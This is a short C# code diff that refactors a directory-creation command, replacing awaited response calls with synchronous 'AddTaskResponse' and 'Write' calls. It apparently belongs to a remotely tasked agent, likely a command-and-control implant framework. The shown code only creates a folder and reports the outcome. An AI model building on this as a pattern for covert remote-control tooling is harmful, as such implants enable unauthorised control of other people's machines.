@@ -25,7 +25,7 @@ namespace Agent
                 {
                     DirectoryInfo dir = Directory.CreateDirectory(args["path"].Replace("\"", ""));
 
-                    await messageManager.AddResponse(new TaskResponse
+                    messageManager.AddTaskResponse(new TaskResponse
                     {
                         completed = true,
                         user_output = "Created directory " + dir.FullName,
@@ -34,7 +34,7 @@ namespace Agent
                 }
                 else
                 {
-                    await messageManager.AddResponse(new TaskResponse
+                    messageManager.AddTaskResponse(new TaskResponse
                     {
                         completed = true,
                         user_output = "No path provided.",
@@ -45,7 +45,7 @@ namespace Agent
             }
             catch (Exception e)
             {
-                await messageManager.Write(e.ToString(), job.task.id, true, "error");
+                messageManager.Write(e.ToString(), job.task.id, true, "error");
                 return;
             }
         }
